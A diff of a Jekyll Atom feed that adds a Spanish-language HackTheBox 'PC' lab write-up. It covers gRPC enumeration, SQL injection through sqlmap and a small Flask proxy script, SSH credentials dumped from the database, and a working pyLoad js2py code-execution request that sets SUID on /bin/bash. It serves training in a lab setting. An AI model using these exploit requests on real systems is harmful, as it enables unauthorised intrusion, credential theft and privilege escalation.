@@ -1,4 +1,304 @@
-<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://localhost:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-23T20:21:10-06:00</updated><id>http://localhost:4000/</id><title type="html">c4rta</title><subtitle>Soy Omar, un radioaficionado amante de la ciberseguridad</subtitle><entry><title type="html">HackTheBox Toxic - LFI to RCE via Log Poisoning y Insecure Deserialization en PHPSESSID</title><link href="http://localhost:4000/htb-toxic/" rel="alternate" type="text/html" title="HackTheBox Toxic - LFI to RCE via Log Poisoning y Insecure Deserialization en PHPSESSID" /><published>2023-05-22T00:00:00-06:00</published><updated>2023-05-22T00:00:00-06:00</updated><id>http://localhost:4000/htb-toxic</id><content type="html" xml:base="http://localhost:4000/htb-toxic/">&lt;p&gt;Este desafio esta bien bonito, primero tenemos una deserializacion insegura en la cookie PHPSESSID la cual nos permitira un LFI, despues mediante Log Poisoning conseguiremos un RCE en el User-Agent.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://localhost:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-24T21:32:25-06:00</updated><id>http://localhost:4000/</id><title type="html">c4rta</title><subtitle>Soy Omar, un radioaficionado amante de la ciberseguridad</subtitle><entry><title type="html">HackTheBox PC - SQL injection in gRPC service</title><link href="http://localhost:4000/htb-pc/" rel="alternate" type="text/html" title="HackTheBox PC - SQL injection in gRPC service" /><published>2023-05-23T00:00:00-06:00</published><updated>2023-05-23T00:00:00-06:00</updated><id>http://localhost:4000/htb-pc</id><content type="html" xml:base="http://localhost:4000/htb-pc/">&lt;p&gt;Esta es una maquina bien interesante por que no tiene puerto 80, asi que descubrimeros el puerto 50051 el cual esta siendo usado por gRPC, despues usaremos un cliente gRPC para ver un poco como se estan estructurando los protobof, con base a las respuestas de las peticiones, haremos un SQL injection en el parametro ID. Para la escalada haremos un port forwarding y explotaremos una vulnerabilidad en pyLoad&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeracion&lt;/h2&gt;
+
+&lt;p&gt;Iniciamos con un escaneo con:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -sS -n -Pn --open -p- 10.129.93.244
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, esto con el fin de iniciar la conexion sin que termine y ademas tarde menos&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;n: para que no haga resolucion DNS y tarde menos el escaneo&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Pn: para evitar el descubrimiento de hosts&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;open: para que solo muestre los puertos abiertos&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;-p-: para que escanee todo el rango de puertos&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Y nos reporto que hay varios puertos abiertos:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE
+22/tcp    open  ssh
+50051/tcp open  unknown
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Les adelanto que si buscamos por versiones y servicios tampoco vamos a encontrar nada, asi que pasamos directamente a buscar en google&lt;/p&gt;
+
+&lt;h3 id=&quot;puerto-50051&quot;&gt;Puerto 50051&lt;/h3&gt;
+
+&lt;p&gt;Al hacer unas busquedas como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;50051 port&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;50051 pentesting&lt;/code&gt; es cuando encuentro que corresponde a gRPC, asi que existe un servidor gRPC en la maquina, antes que nada, vamos a ver que es gRPC&lt;/p&gt;
+
+&lt;h3 id=&quot;grpc&quot;&gt;gRPC&lt;/h3&gt;
+
+&lt;p&gt;gRPC es una implementacion de RPC (Protocolo de llamada a procedimiento remoto) el cuale es usado en aplicaciones cliente-servidor, este funciona de esta forma:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc.svg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;center&gt;imagen de grpc.io&lt;/center&gt;
+
+&lt;p&gt;Primeramente se debe de tener creado un servidor gRPC con un servicio creado en un lenguaje compatible con gRPC, en esa imagen es C++, despues para interactuar con ese servicio se usa un cliente gRPC stub, donde stub no es mas que nada una funcionalidad encargada de serializar los datos que se envian al servidor, en una arquitectura gRPC se hace uso de algo que se llama Protocol Buffers, que es un mecanismo para serializar datos estructurados, cuando se hace una peticion, esto datos pueden ir en JSON&lt;/p&gt;
+
+&lt;h3 id=&quot;interactuando-con-el-servidor-grpc&quot;&gt;Interactuando con el servidor gRPC&lt;/h3&gt;
+
+&lt;p&gt;Una vez sabiendo que existe un servidor gRPC en la maquina, necesitamos un cliente o al menos algo para realizar peticiones hacia ese servidor, aqui encontre dos: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grpcurl&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grpcui&lt;/code&gt;, usaremos ambas:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;grpcurl: &lt;a href=&quot;https://github.com/fullstorydev/grpcurl&quot;&gt;https://github.com/fullstorydev/grpcur&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;grpcui: &lt;a href=&quot;https://github.com/fullstorydev/grpcui&quot;&gt;https://github.com/fullstorydev/grpcur&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Usare gprcurl guiandome de aca: &lt;a href=&quot;https://notes.akenofu.me/Network%20Pen%20test/gRPC/&quot;&gt;https://notes.akenofu.me/Network%20Pen%20test/gRPC/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Primero listare los servicios expuestos por el servidor gRPC:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grpcurl -plaintext 10.129.93.244:50051 list
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Esto nos arroja:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SimpleApp
+grpc.reflection.v1alpha.ServerReflection
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;El unico que nos interesa es el primero, pero antes… Debo de decir que en un servicio gRPC existen metodos con los cuales podemos realizar peticiones hacia ese servicio para que haga cosas que esten previamente definidas&lt;/p&gt;
+
+&lt;p&gt;Para listar los metodos es asi:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grpcurl -plaintext 10.129.93.244:50051 list SimpleApp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SimpleApp.LoginUser
+SimpleApp.RegisterUser
+SimpleApp.getInfo
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Vemos que existen 3 metodos, esos metodos tiene mas definiciones por dentro, que son las estructuras protobuf asi que usaremos el comando:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grpcurl -plaintext 10.129.93.244:50051 describe SimpleApp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SimpleApp is a service:
+service SimpleApp {
+  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
+  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
+  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Y vemos que para el metodo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LoginUser&lt;/code&gt; existe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.LoginUserRequest&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.LoginUserResponse&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora si queremos ver el codigo de un protobuf usamos el comando:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grpcurl -plaintext 10.129.93.244:50051 describe LoginUserRequest
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Y podemos ver ese protobuf:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LoginUserRequest is a message:
+message LoginUserRequest {
+  string username = 1;
+  string password = 2;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Y vemos que esta esperando por un nombre y una contraseña.&lt;/p&gt;
+
+&lt;p&gt;Para no hacerlo tan largo, tenemos que nos podemos iniciar sesion, registrar y otro metodo que nos da una pequeña info, aremos los pasos en este orden para luego analizar una peticion&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Registrarse&lt;/li&gt;
+  &lt;li&gt;Iniciar sesion&lt;/li&gt;
+  &lt;li&gt;Mostrar info&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Te dejo los comando de como Registrarse, iniciar sesion y mostrar info usando grpcurl&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Registro: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grpcurl -plaintext -d &apos;{&quot;username&quot;:&quot;c4rta&quot;, &quot;password&quot;:&quot;12345&quot;}&apos; 10.129.93.244:50051 SimpleApp.RegisterUser&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Login: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grpcurl -plaintext -d &apos;{&quot;username&quot;:&quot;c4rta&quot;, &quot;password&quot;:&quot;12345&quot;}&apos; -v 10.129.93.244:50051 SimpleApp.LoginUser&lt;/code&gt;
+Esto arroja esto:&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Mostrar info:
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grpcurl -plaintext -d &apos;{&quot;id&quot;:&quot;784&quot;}&apos; -rpc-header &apos;token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYzRydGEiLCJleHAiOjE2ODQ5NjM2OTV9.9ocP1Hq9USx
+UAv_2BVxRFWLN8vDzlVxrkbiklyoU9ow&apos; 10.129.93.244:50051 SimpleApp.getInfo
+&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Debes de indicarle el ID y tu JWT.&lt;/p&gt;
+
+&lt;p&gt;Ahora si podemos pasar a la explotacion donde te mostrate 2 formas de hacerlo&lt;/p&gt;
+
+&lt;h3 id=&quot;1-sql-injection-gprcui-y-sqlmap--r&quot;&gt;1. SQL injection, gprcui y sqlmap -r&lt;/h3&gt;
+
+&lt;p&gt;grpcui es un cliente gRPC similar a grpcurl, pero este tiene interfaz grafica, primero nos debemos de conectar al servidor gRPC:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grpcui -plaintext &amp;lt;IP&amp;gt;:50051&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Esto nos abrira una web con las mismas funcionalidades que hicimos con grpcurl.&lt;/p&gt;
+
+&lt;p&gt;Primero creamos un usuario y esto nos debe de salir:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora iniciamos sesion con ese usuario vamos a poder su JWK:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora usaremos esos datos para mostrar la info del usuario que acabamos de crear, pero esta vez interceptaremos la peticion con burp:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos ver que en la parte de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt; se le esta pasando nuestro ID y el servidor nos responde esto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aqui empece a buscar las diferentes vulnerabilidades que pueden a ver en gRPC y encontre este blog &lt;a href=&quot;https://www.trendmicro.com/en_us/research/20/h/how-unsecure-grpc-implementations-can-compromise-apis.html&quot;&gt;https://www.trendmicro.com/en_us/research/20/h/how-unsecure-grpc-implementations-can-compromise-apis.html&lt;/a&gt;, en una parte habla de SQLi, asi que como la data que esta tramitando es al id, entonces decidi probar injectiones en ese campo&lt;/p&gt;
+
+&lt;p&gt;Primero puse una comilla al final del ID:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;data&quot;:[
+  {
+    &quot;id&quot;:&quot;738&apos;&quot;
+  }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Y eso me dio un error:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Seguramente el gestor de base de datos detecto un error en la consulta y arrojo eso, es posible que haya una SQLi, asi que probare con sqlmap.
+Tomando en cuenta que no tenemos un servidor web como tal, entonces debemos de guardar la peticion que interceptamos con burp y usando el argumento -r de sqlmap, podemos hacerlo, este es el archivo de mi peticion:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /invoke/SimpleApp.getInfo HTTP/1.1
+Host: 127.0.0.1:36401
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+x-grpcui-csrf-token: h000rrAARGYkr4dDDax5sQUcnTmszKcRiLhk-0Aep-k
+X-Requested-With: XMLHttpRequest
+Content-Length: 194
+Origin: http://127.0.0.1:36401
+Connection: close
+Referer: http://127.0.0.1:36401/
+Cookie: csrftoken=dv1RLiX7MBGMrZhvyWH0W4U4HIgJZdFp; _grpcui_csrf_token=h000rrAARGYkr4dDDax5sQUcnTmszKcRiLhk-0Aep-k
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+
+{&quot;metadata&quot;:[{&quot;name&quot;:&quot;token&quot;,&quot;value&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYzRydGEiLCJleHAiOjE2ODQ5ODYwNDZ9.BVAx_9R6Cch8vwCUHknTLBm9l0wukqMrsy9TJcsGlJE&quot;}],&quot;data&quot;:[{&quot;id&quot;:&quot;738&quot;}]}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Y el comando de sql map es:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -r &quot;$(pwd)/peticion&quot; -level 5 --risk 3 --batch --dump
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Eso automaticamente nos sacara todas las tablas, columnas, e informacion en ellas, ahi podremos ver un usuario y contraseñas&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/sql1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/sql2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;2-sql-injection-con-sqlmap-simulando-un-proxy&quot;&gt;2. SQL injection con sqlmap simulando un proxy&lt;/h3&gt;
+
+&lt;p&gt;(la idea de la solucion no es mia, gracias al usuario de HTB que me dio la idea)&lt;/p&gt;
+
+&lt;p&gt;Basicamente es levantar un servidor web con python, el cual actua como proxy, y que travez de un parametro recibira el payload de sqlmap. Este actuaria entre sqlmap y el servidor gRPC, el codigo al que llegue es:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nd&quot;&gt;@app.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/payload&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ctrl_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;p&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;{&quot;id&quot;: &quot;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&quot;}&apos;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;grpcurl&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;-plaintext&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;-d&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;-rpc-header&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYzRydGEiLCJleHAiOjE2ODQ5ODYwNDZ9.BVAx_9R6Cch8vwCUHknTLBm9l0wukqMrsy9TJcsGlJE&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;10.10.11.214:50051&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;SimpleApp.getInfo&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;__main__&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12345&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Como pueden ver, al parametro ID vulnerable a SQLi se le concatena el payload, donde ese payload es el de sqlmap, despues se le pasa ese payload a la variable cmd, y por ultimo ejecuta ese comando, que vendria siendo el grpcurl pero con el payload de sqlmap&lt;/p&gt;
+
+&lt;p&gt;Y esto daria el mismo resultado que la primera forma:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/sqli4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora solo queda conectarnos a ssh con las credenciales que obtuvimos&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;usr:&lt;/strong&gt; sau&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;passwd:&lt;/strong&gt; HereIsYourPassWord1431&lt;/p&gt;
+
+&lt;p&gt;Y ya tenemos la primera flag:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sau@pc:~$ cat user.txt 
+9346084c975a3b22536e1c6ef783075f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;escalada&quot;&gt;Escalada&lt;/h2&gt;
+
+&lt;p&gt;Empezare usando linpeas para ver que nos reporta, lo mas interesante es que en la maquina victima esta corriendo el puerto 8000:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y como se imaginan, debemos de hacer port forwarding, ejecutamos este comando en nuestra maquina:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez dentro, veremos una pagina de pyLoad, buscando en google por vulnerabilidades, existe una ejecucion arbitraria de codigo que abusa de la funcion js2py, aca hay un post que habla sobre ello: &lt;a href=&quot;https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/&quot;&gt;https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Para conseguir root, debemos de asignarle permisos SUID a bash, esto lo hacemos con:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -i -s -k -X $&apos;POST&apos; \
+-H $&apos;Host: 127.0.0.1:8000&apos; -H $&apos;Content-Type: application/x-www-form-urlencoded&apos; -H $&apos;Content-Length: 184&apos; \
+--data-binary $&apos;package=xxx&amp;amp;crypted=AAAA&amp;amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29;f=function%20f2(){};&amp;amp;passwords=aaaa&apos; \
+$&apos;http://127.0.0.1:8000/flash/addcrypted2&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y listo, esto es todo, gracias por leer ❤&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><summary type="html">Esta es una maquina bien interesante por que no tiene puerto 80, asi que descubrimeros el puerto 50051 el cual esta siendo usado por gRPC, despues usaremos un cliente gRPC para ver un poco como se estan estructurando los protobof, con base a las respuestas de las peticiones, haremos un SQL injection en el parametro ID. Para la escalada haremos un port forwarding y explotaremos una vulnerabilidad en pyLoad</summary></entry><entry><title type="html">HackTheBox Toxic - LFI to RCE via Log Poisoning y Insecure Deserialization en PHPSESSID</title><link href="http://localhost:4000/htb-toxic/" rel="alternate" type="text/html" title="HackTheBox Toxic - LFI to RCE via Log Poisoning y Insecure Deserialization en PHPSESSID" /><published>2023-05-22T00:00:00-06:00</published><updated>2023-05-22T00:00:00-06:00</updated><id>http://localhost:4000/htb-toxic</id><content type="html" xml:base="http://localhost:4000/htb-toxic/">&lt;p&gt;Este desafio esta bien bonito, primero tenemos una deserializacion insegura en la cookie PHPSESSID la cual nos permitira un LFI, despues mediante Log Poisoning conseguiremos un RCE 